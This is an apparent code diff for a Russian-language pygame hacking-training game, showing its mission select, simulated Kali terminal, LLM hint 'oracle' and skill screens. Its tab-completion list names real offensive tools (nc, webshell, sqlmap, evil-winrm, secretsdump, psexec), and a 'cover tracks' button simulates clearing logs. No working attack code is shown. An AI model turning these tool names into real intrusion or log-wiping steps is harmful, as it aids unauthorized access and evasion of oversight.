+        # Матричный дождь
+        for x, y, ch, a in self.rain:
+            self.surf.blit(F(10).render(ch, True, (0, a, 0)), (x, y))
+        ov = pygame.Surface((SW, SH), pygame.SRCALPHA)
+        ov.fill((2, 4, 10, 155))
+        self.surf.blit(ov, (0, 0))
+        # Лого
+        ly = 34
+        p  = abs(math.sin(self.t * 2.1))
+        for i, ln in enumerate(self.LOGO):
+            gc = (0, min(255, int(55 + 200 * p)), min(190, 45 + i * 15))
+            s  = F(13, True).render(ln, True, gc)
+            self.surf.blit(s, ((SW - s.get_width()) // 2, ly + i * 15))
+        sub = ly + len(self.LOGO) * 15 + 10
+        T(self.surf, "CYBER OPS  v5.0  —  Educational HackTheBox-style Trainer",
+          14, P["cyan"], SW // 2, sub, cx=True)
+        T(self.surf, "Гелич К.А.  |  КЕМ-25-01  |  РГУ нефти и газа (НИУ) им. И.М. Губкина",
+          11, P["gray"], SW // 2, sub + 22, cx=True)
+        # Лог загрузки
+        log_y = sub + 50
+        for i, ln in enumerate(self.typed[-12:]):
+            col = P["green"] if i == len(self.typed) - 1 else P["gray"]
+            T(self.surf, f"  [OK]  {ln}", 13, col, 85, log_y + i * 20)
+        if self.cur:
+            bl = "_" if int(time.time() * 4) % 2 else " "
+            T(self.surf, f"  [..]  {self.cur}{bl}", 13, P["yellow"],
+              85, log_y + len(self.typed) * 20)
+        if self.li >= len(self.LINES):
+            a = int(abs(math.sin(self.t * 1.8)) * 255)
+            T(self.surf, "[ НАЖМИТЕ ЛЮБУЮ КЛАВИШУ ]", 18, (0, a, 0),
+              SW // 2, SH - 56, bold=True, cx=True)
+        self.surf.blit(crt(), (0, 0))
+
+
+# ═══════════════════════════════════════════════════════════════
+#  ЭКРАН ВЫБОРА МИССИИ
+# ═══════════════════════════════════════════════════════════════
+class SelectScreen:
+    DIFF_COL = {"m1": (0,200,80), "m2": (255,180,0), "m3": (235,60,60)}
+
+    def __init__(self, surf, gs: GameState, ai: "AI"):
+        self.surf = surf; self.gs = gs; self.ai = ai
+        self.t    = 0.0; self.hov = None
+        self.rects: Dict[str, pygame.Rect] = {}
+        self.rain  = [
+            (random.randint(0, SW), random.randint(0, SH),
+             chr(random.randint(0x30A0, 0x30FF)), random.randint(5, 36))
+            for _ in range(110)
+        ]
+        self._btn_sk = Btn(SW - 215, SH - 66, 200, 50,
+                           f"★ Навыки  ({gs.sp} SP)",
+                           P["panel2"], P["purple"], P["white"], 12)
+        self._btn_sk.cb(lambda: self._go("skills"))
+        self._phase_cb: Optional[Callable] = None
+
+    def set_phase_cb(self, cb): self._phase_cb = cb
+    def _go(self, ph):
+        if self._phase_cb: self._phase_cb(ph)
+
+    def on(self, ev):
+        self._btn_sk.on(ev)
+        if ev.type == pygame.MOUSEMOTION:
+            self.hov = None
+            for mid, rr in self.rects.items():
+                if rr.collidepoint(ev.pos): self.hov = mid
+        if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
+            for mid, rr in self.rects.items():
+                if rr.collidepoint(ev.pos):
+                    self._start(mid); return
+
+    def _start(self, mid: str):
+        gs = self.gs
+        if mid == "m2" and "m1" not in gs.done_missions: return
+        if mid == "m3" and "m2" not in gs.done_missions: return
+        gs.start_mission(mid)
+        self.ai.reset(gs)
+        self._go("play")
+
+    def update(self, dt):
+        self.t += dt
+        self._btn_sk.label = f"★ Навыки  ({self.gs.sp} SP)"
+        if int(self.t * 5) % 5 == 0:
+            for i in random.sample(range(len(self.rain)), 7):
+                self.rain[i] = (random.randint(0, SW), random.randint(0, SH),
+                                chr(random.randint(0x30A0, 0x30FF)), random.randint(5, 36))
+
+    def draw(self):
+        self.surf.fill(P["bg"])
+        for x, y, ch, a in self.rain:
+            self.surf.blit(F(9).render(ch, True, (0, a, 0)), (x, y))
+        ov = pygame.Surface((SW, SH), pygame.SRCALPHA)
+        ov.fill((*P["bg"], 188))
+        self.surf.blit(ov, (0, 0))
+        T(self.surf, "[ GHOST PROTOCOL: CYBER OPS ]", 24, P["green"], SW//2, 30, True, cx=True)
+        T(self.surf, "ВЫБЕРИТЕ ОПЕРАЦИЮ", 13, P["gray"], SW//2, 62, cx=True)
+        # HUD-строка
+        box(self.surf, pygame.Rect(14, 82, SW - 28, 36), P["panel2"], P["border"])
+        T(self.surf,
+          f"АГЕНТ: GHOST  │  CR: {self.gs.credits:,}  │  XP: {self.gs.xp:,}"
+          f"  │  SP: {self.gs.sp}  │  ПРОЙДЕНО: {len(self.gs.done_missions)}/3",
+          12, P["cyan"], 28, 93)
+
+        mids = ["m1", "m2", "m3"]
+        CW = 432; CH = 560; GAP = 16
+        TW = len(mids) * CW + (len(mids) - 1) * GAP
+        sx = (SW - TW) // 2
+        self.rects.clear()
+
+        for i, mid in enumerate(mids):
+            m    = MISSIONS[mid]
+            rx   = sx + i * (CW + GAP); ry = 130
+            lock = (mid == "m2" and "m1" not in self.gs.done_missions) or \
+                   (mid == "m3" and "m2" not in self.gs.done_missions)
+            done = mid in self.gs.done_missions
+            hov  = self.hov == mid and not lock
+            rect = pygame.Rect(rx, ry, CW, CH)
+            self.rects[mid] = rect
+
+            bcol = (7, 22, 7) if done else ((9, 10, 20) if lock else P["panel"])
+            brd  = (P["green"] if done else P["dkgray"] if lock
+                    else (P["bordhi"] if hov else P["border"]))
+            box(self.surf, rect, bcol, brd, 2 if hov else 1, 8)
+
+            dc   = self.DIFF_COL[mid]
+            y0   = ry + 14
+
+            # Заголовок
+            if lock:
+                T(self.surf, "🔒  ЗАБЛОКИРОВАНО", 14, P["gray"], rx + CW//2, y0, cx=True)
+            elif done:
+                T(self.surf, "✓  ВЫПОЛНЕНО", 14, P["green"], rx + CW//2, y0, True, cx=True)
+            T(self.surf, m["name"], 18, dc, rx + CW//2, y0 + 22, True, cx=True)
+            T(self.surf, m["diff"] + "  " + m["type"].upper(), 11,
+              P["gray"], rx + CW//2, y0 + 46, cx=True)
+            pygame.draw.line(self.surf, P["border"], (rx+12, y0+64), (rx+CW-12, y0+64), 1)
+
+            # Мини-визуализация
+            self._mini(mid, rx + 8, y0 + 74, CW - 16, 90, lock)
+
+            # Описание
+            y1 = y0 + 178
+            for ln in wrap_text(m["desc"], CW - 20, 11):
+                T(self.surf, ln, 11, P["white"], rx + 10, y1, max_w=CW - 16)
+                y1 += 17
+
+            # Теги
+            y1 += 4
+            tx = rx + 10
+            for tag in m["tags"]:
+                tw = Tw(tag, 10) + 12
+                box(self.surf, pygame.Rect(tx, y1, tw, 18), P["dkgray"], P["border"], 1, 3)
+                T(self.surf, tag, 10, P["cyan"], tx + 6, y1 + 4)
+                tx += tw + 6
+            y1 += 28
+
+            # Цели
+            pygame.draw.line(self.surf, P["border"], (rx+12, y1), (rx+CW-12, y1), 1)
+            y1 += 8
+            T(self.surf, "ЦЕЛИ:", 10, P["gray"], rx + 10, y1)
+            y1 += 14
+            for obj in m["objectives"]:
+                T(self.surf, f"▸ {obj['text']}", 10, P["dim"], rx + 10, y1, max_w=CW - 16)
+                y1 += 14
+
+            # Награда
+            pygame.draw.line(self.surf, P["border"], (rx+12, ry+CH-46), (rx+CW-12, ry+CH-46), 1)
+            T(self.surf, f"+{m['reward']['cr']:,} CR", 11, P["yellow"], rx + 16, ry + CH - 34)
+            T(self.surf, f"+{m['reward']['xp']:,} XP", 11, P["cyan"],   rx + CW//2, ry + CH - 34, cx=True)
+            T(self.surf, f"+{m['reward']['sp']} SP",   11, P["purple"], rx + CW - 14, ry + CH - 34, rx=True)
+
+            # Кнопка старта
+            if not lock and not done:
+                bcl = (P["bordhi"] if hov else P["border"])
+                box(self.surf, pygame.Rect(rx + 12, ry + CH - 26, CW - 24, 20),
+                    (0, 20, 50) if hov else P["dkgray"], bcl, 1, 4)
+                T(self.surf, "▶  НАЧАТЬ ОПЕРАЦИЮ",
+                  11, P["bordhi"] if hov else P["gray"],
+                  rx + CW//2, ry + CH - 16, cx=True)
+
+        self._btn_sk.draw(self.surf)
+        self.surf.blit(crt(), (0, 0))
+
+    def _mini(self, mid, rx, ry, cw, ch, lock):
+        box(self.surf, pygame.Rect(rx, ry, cw, ch), P["dkgray"], P["border"])
+        if lock:
+            T(self.surf, "🔒", 22, P["gray"], rx + cw//2, ry + ch//2, cx=True)
+            return
+        def nx(x): return int(rx + 10 + x * (cw - 20))
+        def ny(y): return int(ry + 6  + y * (ch - 12))
+        if mid == "m1":
+            nodes = [(0.5,0.1,"/"),(0.25,0.47,"/api"),(0.5,0.47,"/admin"),
+                     (0.75,0.47,"/upload"),(0.5,0.82,"/uploads")]
+            edges = [(0,1),(0,2),(0,3),(3,4)]
+            for a,b in edges:
+                pygame.draw.line(self.surf, P["border"],
+                    (nx(nodes[a][0]),ny(nodes[a][1])),
+                    (nx(nodes[b][0]),ny(nodes[b][1])), 1)
+            for x,y,lbl in nodes:
+                col = P["red"] if lbl in ("/admin","/upload","/uploads") else P["blue"]
+                pygame.draw.circle(self.surf, col, (nx(x),ny(y)), 5)
+                T(self.surf, lbl, 8, P["gray"], nx(x)+7, ny(y)-5, max_w=65)
+        elif mid == "m2":
+            hosts = [(0.5,0.08,"DC01"),(0.18,0.5,"WEB01"),(0.82,0.5,"DB01"),
+                     (0.5,0.76,"FILE01"),(0.18,0.9,"WS01")]
+            edges = [(0,1),(0,2),(0,3),(3,4)]
+            for a,b in edges:
+                pygame.draw.line(self.surf, P["border"],
+                    (nx(hosts[a][0]),ny(hosts[a][1])),
+                    (nx(hosts[b][0]),ny(hosts[b][1])), 1)
+            for x,y,lbl in hosts:
+                col = P["purple"] if lbl=="DC01" else P["blue"]
+                pygame.draw.circle(self.surf, col, (nx(x),ny(y)), 5)
+                T(self.surf, lbl, 8, P["gray"], nx(x)+7, ny(y)-5)
+        else:
+            for i, ln in enumerate(HEX_LINES[:5]):
+                c = P["green"] if i % 2 == 0 else P["cyan"]
+                T(self.surf, ln[:38], 8, c, rx+8, ry+8+i*18, max_w=cw-16)
+
+
+# ═══════════════════════════════════════════════════════════════
+#  ИГРОВОЙ ЭКРАН
+# ═══════════════════════════════════════════════════════════════
+class GameScreen:
+    LH  = 17  # высота строки терминала
+    # Все поддерживаемые команды для Tab-completion
+    CMDS = [
+        "help","nmap","gobuster","dirb","ffuf","feroxbuster","sqlmap",
+        "nikto","curl","wget","burp","wfuzz","upload","webshell","nc",
+        "ls","cat","find","sudo","python3","mysql","cover",
+        "enum4linux-ng","enum4linux","smbclient","smbmap",
+        "crackmapexec","cme","netexec","nxc","kerbrute",
+        "getuserspns.py","getuserspns","hashcat","john",
+        "evil-winrm","secretsdump.py","secretsdump","bloodhound-python",
+        "psexec.py","net","ping",
+        "file","checksec","readelf","nm","strings","xxd","hexdump",
+        "objdump","gdb","r2","radare2","strace","ltrace",
+        "python3","openssl","grep","find",
+        "whoami","id","hostname","uname","date","pwd","echo",
+        "clear","cls","history","oracle",
+    ]
+
+    def __init__(self, surf, gs: GameState, ai: "AI"):
+        self.surf  = surf; self.gs = gs; self.ai = ai; self.t = 0.0
+        self.lines : List[Tuple[str,str]] = []
+        self.queue : List[Tuple[str,str]] = []
+        self.qt = 0.0; self.qs = 0.045; self.busy = False
+        self.inp  = ""; self.hist: List[str] = []; self.hi = -1
+        self.scr  = 0
+        self.status = "active"
+        self._endbtn: Optional[Btn] = None
+        self._phase_cb: Optional[Callable] = None
+
+        hx = VIS_W + TERM_W; hw = HUD_W
+        bw = (hw - 24) // 2
+        self.b_hint  = Btn(hx+8,      SH-148, bw,   38, "💡 Подсказка",
+                           P["panel2"], (20,40,90), P["cyan"], 11)
+        self.b_cover = Btn(hx+12+bw,  SH-148, bw,   38, "🧹 Следы",
+                           P["dkgray"], P["dkgrn"], P["green"], 11)
+        self.b_menu  = Btn(hx+8,      SH-96,  bw,   38, "☰  Меню",
+                           P["dkred"], P["red"], P["white"], 12)
+        self.b_skill = Btn(hx+12+bw,  SH-96,  bw,   38, "★  Навыки",
+                           P["dkgray"], P["purple"], P["white"], 12)
+        self.b_hint .cb(self._hint)
+        self.b_cover.cb(self._cover)
+        self.b_menu .cb(self._to_menu)
+        self.b_skill.cb(lambda: self._go("skills"))
+        self._welcome()
+
+    def set_phase_cb(self, cb): self._phase_cb = cb
+    def _go(self, ph):
+        if self._phase_cb: self._phase_cb(ph)
+    def _to_menu(self):
+        save_progress(self.gs.to_dict()); self._go("menu")
+
+    def _q(self, items: List[Tuple[str,str]], step=0.045):
+        self.queue.extend(items); self.qs = step; self.busy = True
+
+    def _add(self, text: str, col: str = "td"):
+        self.lines.append((text, col))
+        if len(self.lines) > 1200:
+            self.lines = self.lines[-900:]
+
+    def _ora_cb(self, text):
+        if text:
+            fn = F(13); max_w = TERM_W - 28; prefix = "  [ORACLE] "
+            pw = fn.size(prefix)[0]; avail = max_w - pw
+            for ln in wrap_text(text, avail, 13):
+                self._add(prefix + ln, "tai")
+        else:
+            self._add("  [ORACLE] — ИИ недоступен. Добавь OPENROUTER_API_KEY в .env", "ts")
+
+    def _adv_cb(self, text):
+        if text:
+            fn = F(13); max_w = TERM_W - 28; prefix = "  [ЗАЩИТА] "
+            pw = fn.size(prefix)[0]; avail = max_w - pw
+            for ln in wrap_text(text, avail, 13):
+                self._add(prefix + ln, "tadv")
+
+    def _welcome(self):
+        gs = self.gs; m = MISSIONS[gs.active_mid]; sep = "═" * 58
+        self._q([
+            (sep,                                    "th"),
+            (f"  {m['code']}",                      "th"),
+            (f"  Цель: {m['target']}",               "th"),
+            (sep,                                    "th"),
+            (f"  Тип: {m['type'].upper()}   Сложность: {m['diff']}", "ti"),
+            (f"  Теги: {', '.join(m['tags'])}",     "ts"),
+            ("",                                     "ts"),
+            ("  Введите  help    — справка по командам",   "ts"),
+            ("  Введите  oracle  — подсказка от ИИ",       "ts"),
+            ("",                                     "ts"),
+        ], 0.018)
+        self.ai.oracle(
+            f"Начало {m['code']}. Тип: {m['type']}. "
+            f"2 предложения вводного инструктажа — что нужно сделать первым.",
+            self._ora_cb, gs,
+        )
+
+    def on(self, ev):
+        for b in (self.b_hint, self.b_cover, self.b_menu, self.b_skill):
+            b.on(ev)
+        if self._endbtn:
+            self._endbtn.on(ev)
+        if ev.type == pygame.MOUSEWHEEL:
+            mx, _ = pygame.mouse.get_pos()
+            if VIS_W <= mx < VIS_W + TERM_W:
+                self.scr = max(0, self.scr - ev.y * 2)
+        if ev.type == pygame.KEYDOWN:
+            k = ev.key
+            if k == pygame.K_RETURN:
+                cmd = self.inp.strip(); self.inp = ""; self.scr = 0
+                if cmd:
+                    self._run(cmd)
+            elif k == pygame.K_BACKSPACE:
+                self.inp = self.inp[:-1]
+            elif k == pygame.K_UP:
+                if self.hist:
+                    self.hi = min(self.hi + 1, len(self.hist) - 1)
+                    self.inp = self.hist[-(self.hi + 1)]
+            elif k == pygame.K_DOWN:
+                if self.hi > 0:
+                    self.hi -= 1
+                    self.inp = self.hist[-(self.hi + 1)]
+                else:
+                    self.hi = -1; self.inp = ""
+            elif k == pygame.K_TAB:
+                self._complete()
+            elif k == pygame.K_ESCAPE:
+                self._to_menu()
+            elif ev.unicode and ev.unicode.isprintable() and len(self.inp) < 120:
+                self.inp += ev.unicode
+
+    def _complete(self):
+        """Tab-completion по списку команд."""
+        v = self.inp.lower()
+        if not v:
+            return
+        matches = [c for c in self.CMDS if c.startswith(v)]
+        if len(matches) == 1:
+            self.inp = matches[0] + " "
+        elif len(matches) > 1:
+            self._add("  [TAB]  " + "  ".join(matches), "ts")
+
+    def _run(self, cmd: str):
+        # Добавим эхо команды
+        self._add(f"  ghost@kali:~$ {cmd}", "tc")
+        self.hist.append(cmd)
+        if len(self.hist) > 50:
+            self.hist.pop(0)
+        self.hi = -1
+
+        # Специальная команда oracle / hint
+        if cmd.strip().lower().startswith(("oracle", "hint")):
+            prompt = cmd.strip()[6:].strip() or "Что делать дальше?"
+            self.gs.hints_used += 1
+            self._add("  [ORACLE] Анализирую ситуацию...", "tai")
+            self.ai.oracle(prompt, self._ora_cb, self.gs)
+            return
+
+        # Запуск команды
+        result = run_cmd(cmd, self.gs)
+
+        # Обработка clear
+        if not result.lines:
+            if cmd.strip().lower() in ("clear", "cls", "очист"):
+                self.lines.clear()
+                self.scr = 0
+            return
+
+        # Очередь вывода
+        self._q(result.lines)
+
+        # Реакция системы защиты при высокой угрозе
+        if self.gs.threat > 0.55 and random.random() < 0.3:
+            self.ai.adversary(
+                f"Обнаружена атака: {cmd}. Угроза {self.gs.threat:.0%}.",
+                self._adv_cb,
+            )
+            do_flash((235, 40, 55), 0.22)
+
+        # Проверка завершения миссии
+        if self.gs.all_done() and self.status == "active":
+            self.status = "done"
+            m   = MISSIONS[self.gs.active_mid]
+            rwd = m["reward"]
+            self.gs.credits       += rwd["cr"]
+            self.gs.xp            += rwd["xp"]
+            self.gs.sp            += rwd["sp"]
+            if self.gs.active_mid not in self.gs.done_missions:
+                self.gs.done_missions.append(self.gs.active_mid)
+            save_progress(self.gs.to_dict())
+            sep = "═" * 58
+            self._q([
+                ("", "ts"),
+                (sep,                                              "th"),
+                ("  🏆  ВСЕ ЦЕЛИ ВЫПОЛНЕНЫ!",                    "th"),
+                (sep,                                              "th"),
+                (f"  [+] Награда: +{rwd['cr']:,} CR  +{rwd['xp']:,} XP  +{rwd['sp']} SP", "to"),
+                ("",  "ts"),
+            ], 0.03)
+            do_flash((0, 200, 80), 0.4)
+            bx = VIS_W + TERM_W // 2
+            self._endbtn = Btn(bx - 115, SH - 90, 230, 50,
+                               "▶  ДЕБРИФИНГ",
+                               P["dkgrn"], P["green"], P["white"], 14)
+            self._endbtn.cb(lambda: self._go("debrief"))
+
+    def _hint(self):
+        self.gs.hints_used += 1
+        self._add("", "ts")
+        self._add("  [ORACLE] Запрос подсказки...", "tai")
+        gs = self.gs; m = MISSIONS[gs.active_mid]
+        pending = [o["text"] for o in m["objectives"] if not gs.objectives.get(o["key"])]
+        prompt  = (
+            f"Миссия: {m['code']}. Тип: {m['type']}. "
+            f"Нерешённые цели: {pending[:2]}. "
+            "Дай краткую подсказку следующего шага — 2 предложения, без полных команд."
+        )
+        self.ai.oracle(prompt, self._ora_cb, gs)
+
+    def _cover(self):
+        bonus = "(+10% навык Сокрытие следов)" if "p1" in self.gs.skills else ""
+        self.gs.cover()
+        self._add("", "ts")
+        self._add(f"  [+] Следы заметены. Угроза снижена. {bonus}", "to")
+        self._add("  [*] Временные файлы удалены, логи очищены", "ts")
+
+    def update(self, dt):
+        self.t += dt
+        # Постепенный вывод очереди
+        if self.queue:
+            self.qt += dt
+            if self.qt >= self.qs:
+                self.qt = 0
+                batch = 3
+                for _ in range(batch):
+                    if self.queue:
+                        self._add(*self.queue.pop(0))
+                if not self.queue:
+                    self.busy = False
+
+    def draw(self):
+        self.surf.fill(P["bg"])
+        self._draw_vis()
+        self._draw_term()
+        self._draw_hud()
+        if self._endbtn:
+            self._endbtn.draw(self.surf)
+        self.surf.blit(crt(), (0, 0))
+
+    # ── Панель визуализации (левая) ───────────────────────────
+    def _draw_vis(self):
+        surf = self.surf
+        gs   = self.gs
+        mid  = gs.active_mid
+        m    = MISSIONS[mid]
+        box(surf, pygame.Rect(0, 0, VIS_W, SH), P["panel"], P["border"])
+
+        # Заголовок
+        box(surf, pygame.Rect(0, 0, VIS_W, 38), P["panel2"], P["border"])
+        T(surf, m["code"], 11, P["pink"], VIS_W//2, 19, cx=True)
+
+        # Угроза
+        thr_level = int(gs.threat * 4)
+        thr_col   = THR[min(thr_level, 4)]
+        T(surf, "УРОВЕНЬ УГРОЗЫ", 10, P["gray"], 10, 46)
+        T(surf, f"{gs.threat*100:.0f}%", 10, thr_col, VIS_W-10, 46, rx=True)
+        hbar(surf, 10, 60, VIS_W-20, 8, gs.threat, thr_col)
+        T(surf, THR_NAME[min(thr_level, 4)], 10, thr_col, VIS_W//2, 78, cx=True)
+
+        # Цели
+        T(surf, "ЦЕЛИ:", 10, P["gray"], 10, 95)
+        cy = 110
+        for obj in m["objectives"]:
+            done = gs.objectives.get(obj["key"], False)
+            col  = P["green"] if done else P["dim"]
+            mark = "✓" if done else "○"
+            T(surf, f"  {mark} {obj['text']}", 10, col, 8, cy, max_w=VIS_W-16)
+            cy += 15
+
+        # Статистика
+        cy += 5
+        pygame.draw.line(surf, P["border"], (8, cy), (VIS_W-8, cy), 1); cy += 8
+        elapsed = int(time.time() - gs.start_time)
+        stats = [
+            ("Время",    f"{elapsed//60:02d}:{elapsed%60:02d}"),
+            ("Команды",  str(len(gs.actions))),
+            ("Подсказки",str(gs.hints_used)),
+        ]
+        for lbl, val in stats:
+            T(surf, lbl, 10, P["gray"], 10, cy)
+            T(surf, val, 10, P["cyan"], VIS_W-10, cy, rx=True)
+            cy += 15
+
+        # Мини-карта / hex-просмотр
+        cy = int(cy)
+        cy += 8
+        pygame.draw.line(surf, P["border"], (8, cy), (VIS_W-8, cy), 1); cy += 8
+        self._draw_mini_map(mid, gs, 8, int(cy), int(VIS_W-16), int(SH-cy-16))
+
+    def _draw_mini_map(self, mid, gs, rx, ry, cw, ch):
+        surf = self.surf
+        box(surf, pygame.Rect(rx, ry, cw, ch), P["dkgray"], P["border"])
+        if mid == "m1":
+            self._draw_web_map(gs, rx, ry, cw, ch)
+        elif mid == "m2":
+            self._draw_ad_map(gs, rx, ry, cw, ch)
+        else:
+            self._draw_hex_view(rx, ry, cw, ch)
+
+    def _draw_web_map(self, gs, rx, ry, cw, ch):
+        surf = self.surf
+        T(surf, "WEB MAP", 9, P["gray"], rx+4, ry+4)
+        known = gs.flags.get("known_paths", {})
+        nodes = [
+            ("/",                (0.5,  0.10), P["blue"]),
+            ("/login.php",       (0.15, 0.35), P["gray"]),
+            ("/admin/",          (0.5,  0.35), P["red"]  if "/admin/" in known else P["dkgray"]),
+            ("/upload.php",      (0.85, 0.35), P["orange"] if "/upload.php" in known else P["dkgray"]),
+            ("/api/users.php",   (0.3,  0.65), P["red"]  if "/api/users.php" in known else P["dkgray"]),
+            ("/uploads/",        (0.7,  0.65), P["gray"] if "/uploads/" in known else P["dkgray"]),
+        ]
+        edges = [(0,1),(0,2),(0,3),(0,4),(3,5)]
+
+        def nx(x): return int(rx + 6 + x*(cw-12))
+        def ny(y): return int(ry + 20 + y*(ch-28))
+
+        for a, b in edges:
+            xa,ya,_ = nodes[a]; xb,yb,_ = nodes[b]
+            pygame.draw.line(surf, P["border"], (nx(xa),ny(ya)), (nx(xb),ny(yb)), 1)
+        for lbl, (px,py), col in nodes:
+            pygame.draw.circle(surf, col, (nx(px),ny(py)), 5)
+            T(surf, lbl, 8, P["gray"], nx(px)+7, ny(py)-5, max_w=70)
+
+    def _draw_ad_map(self, gs, rx, ry, cw, ch):
+        surf  = self.surf
+        known = gs.flags.get("known_hosts", {})
+        T(surf, "AD NETWORK", 9, P["gray"], rx+4, ry+4)
+        hosts = [
+            ("10.10.10.10","DC01",  (0.5, 0.12), P["purple"]),
+            ("10.10.10.20","WEB01", (0.15,0.45), P["blue"]),
+            ("10.10.10.30","DB01",  (0.85,0.45), P["blue"]),
+            ("10.10.10.40","FILE01",(0.5, 0.72), P["blue"]),
+            ("10.10.10.50","WS01",  (0.2, 0.88), P["gray"]),
+        ]
+        edges = [(0,1),(0,2),(0,3),(3,4)]
+        def nx(x): return int(rx+6+x*(cw-12))
+        def ny(y): return int(ry+20+y*(ch-28))
+        for a,b in edges:
+            xa,ya = hosts[a][2]; xb,yb = hosts[b][2]
+            pygame.draw.line(surf, P["border"], (nx(xa),ny(ya)), (nx(xb),ny(yb)), 1)
+        for ip, name, (px,py), dcol in hosts:
+            kh  = known.get(ip, {})
+            col = P["green"] if kh.get("state")=="owned" else \
+                  P["yellow"] if kh.get("state")=="scanned" else dcol
+            r = 7 if kh.get("state")=="owned" else 5
+            pygame.draw.circle(surf, col, (nx(px),ny(py)), r)
+            T(surf, name, 8, P["gray"], nx(px)+9, ny(py)-5)
+            if kh.get("state")=="owned":
+                T(surf, "OWNED", 8, P["green"], nx(px)+9, ny(py)+5)
+
+    def _draw_hex_view(self, rx, ry, cw, ch):
+        surf = self.surf
+        T(surf, "HEX VIEW: darkloader", 9, P["gray"], rx+4, ry+4)
+        for i, ln in enumerate(HEX_LINES[:7]):
+            c = P["green"] if i % 2 == 0 else P["cyan"]
+            T(surf, ln[:36], 9, c, rx+6, ry+20+i*21, max_w=cw-12)
+
+    # ── Терминал (центр) ──────────────────────────────────────
+    def _draw_term(self):
+        surf = self.surf
+        tx   = VIS_W; tw = TERM_W
+        box(surf, pygame.Rect(tx, 0, tw, SH), P["bg"], P["border"])
+
+        # Заголовок терминала
+        box(surf, pygame.Rect(tx, 0, tw, 28), P["panel2"], P["border"])
+        T(surf, "ghost@kali: ~ [Ghost Protocol Terminal v5.0]",
+          11, P["gray"], tx + tw//2, 14, cx=True)
+
+        # Рабочая область
+        area_h  = SH - 28 - 32
+        LH      = self.LH
+        visible = area_h // LH
+        total   = len(self.lines)
+        scroll  = max(0, min(self.scr, max(0, total - visible)))
+        self.scr = scroll
+
+        start = max(0, total - visible - scroll)
+        end   = start + visible
+        clip  = pygame.Rect(tx+2, 28, tw-4, area_h)
+        surf.set_clip(clip)
+        for i, (txt, col) in enumerate(self.lines[start:end]):
+            fn  = F(13)
+            img = fn.render(str(txt), True, P.get(col, P["td"]))
+            if img.get_width() > tw - 16:
+                img = img.subsurface(pygame.Rect(0, 0, tw-16, img.get_height()))
+            surf.blit(img, (tx+8, 28 + i*LH))
+        surf.set_clip(None)
+
+        # Полоса прокрутки
+        if total > visible:
+            sbh  = max(20, int(area_h * visible / total))
+            smax = area_h - sbh
+            sb_y = int(28 + smax * scroll / max(1, total - visible))
+            pygame.draw.rect(surf, P["dkgray"], (tx+tw-6, 28, 4, area_h))
+            pygame.draw.rect(surf, P["border"],  (tx+tw-6, sb_y, 4, sbh), border_radius=2)
+
+        # Строка ввода
+        box(surf, pygame.Rect(tx, SH-32, tw, 32), P["panel2"], P["border"])
+        prompt = "ghost@kali:~$ "
+        pw = T(surf, prompt, 13, P["green"], tx+8, SH-18)
+        T(surf, self.inp, 13, P["green"], tx+8+pw, SH-18, max_w=tw-pw-28)
+        if int(time.time()*3) % 2:
+            cx = tx+8+pw+Tw(self.inp, 13)+2
+            pygame.draw.rect(surf, P["green"], (cx, SH-26, 8, 16))
+
+    # ── HUD (правая панель) ───────────────────────────────────
+    def _draw_hud(self):
+        surf = self.surf
+        gs   = self.gs
+        hx   = VIS_W + TERM_W; hw = HUD_W
+        box(surf, pygame.Rect(hx, 0, hw, SH), P["panel"], P["border"])
+
+        y = 8
+        T(surf, "HUD", 11, P["pink"], hx+hw//2, y+6, cx=True); y += 20
+        pygame.draw.line(surf, P["border"], (hx+8, y), (hx+hw-8, y)); y += 8
+
+        # Кредиты / XP / SP
+        for lbl, val, col in [
+            ("КРЕДИТЫ", f"{gs.credits:,}", P["yellow"]),
+            ("XP",       f"{gs.xp:,}",     P["cyan"]),
+            ("SP",       str(gs.sp),        P["purple"]),
+        ]:
+            T(surf, lbl, 9,  P["gray"], hx+10, y)
+            T(surf, val,  11, col, hx+hw-10, y, rx=True)
+            y += 16
+
+        pygame.draw.line(surf, P["border"], (hx+8, y), (hx+hw-8, y)); y += 8
+
+        # Навыки
+        T(surf, "НАВЫКИ:", 9, P["gray"], hx+10, y); y += 14
+        for sid in gs.skills:
+            s = next((x for x in SKILLS if x[0]==sid), None)
+            if s:
+                T(surf, f"  ★ {s[1]}", 9, P["purple"], hx+10, y, max_w=hw-16)
+                y += 13
+
+        pygame.draw.line(surf, P["border"], (hx+8, y), (hx+hw-8, y)); y += 8
+
+        # Цели
+        T(surf, "ЦЕЛИ:", 9, P["gray"], hx+10, y); y += 14
+        for obj in MISSIONS[gs.active_mid]["objectives"]:
+            done = gs.objectives.get(obj["key"], False)
+            col  = P["green"] if done else P["dim"]
+            mark = "✓" if done else "○"
+            T(surf, f"  {mark} {obj['text']}", 9, col, hx+10, y, max_w=hw-16)
+            y += 13
+
+        pygame.draw.line(surf, P["border"], (hx+8, SH-160), (hx+hw-8, SH-160))
+        # Кнопки
+        self.b_hint .draw(surf)
+        self.b_cover.draw(surf)
+        self.b_menu .draw(surf)
+        self.b_skill.draw(surf)
+
+        # Подсказка Tab
+        T(surf, "Tab=автодополнение  ↑↓=история",
+          9, P["ts"], hx+hw//2, SH-6, cx=True)
+
+
+# ═══════════════════════════════════════════════════════════════
+#  ЭКРАН НАВЫКОВ
+# ═══════════════════════════════════════════════════════════════
+class SkillScreen:
+    NR = 22  # радиус узла
+
+    def __init__(self, surf, gs: GameState):
+        self.surf = surf; self.gs = gs; self.t = 0.0
+        self.hov: Optional[str] = None
+        self.notif = ""; self.notif_t = 0.0
+        self.back = Btn(SW//2-100, SH-64, 200, 48, "← НАЗАД",
+                        P["panel2"], P["border"], P["white"], 13)
+        self._phase_cb: Optional[Callable] = None
+        self.back.cb(lambda: self._go("menu"))
+
+    def set_phase_cb(self, cb): self._phase_cb = cb
+    def _go(self, ph):
+        if self._phase_cb: self._phase_cb(ph)
+
+    def on(self, ev):
+        self.back.on(ev)
+        if ev.type == pygame.MOUSEMOTION:
+            mx, my = ev.pos
+            self.hov = None
+            for s in SKILLS:
+                sx, sy = skill_pos(s[0])
+                if math.hypot(mx-sx, my-sy) < self.NR:
+                    self.hov = s[0]; break
+        if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
+            if self.hov:
+                self._buy(self.hov)
+
+    def _buy(self, sid: str):
+        gs  = self.gs
+        s   = next((x for x in SKILLS if x[0] == sid), None)
+        if not s: return
+        cost = s[4]; reqs = s[6]
+        if sid in gs.skills:
+            self.notif = f"Навык «{s[1]}» уже изучен"
+        elif gs.sp < cost:
+            self.notif = f"Нет SP: нужно {cost}, есть {gs.sp}"
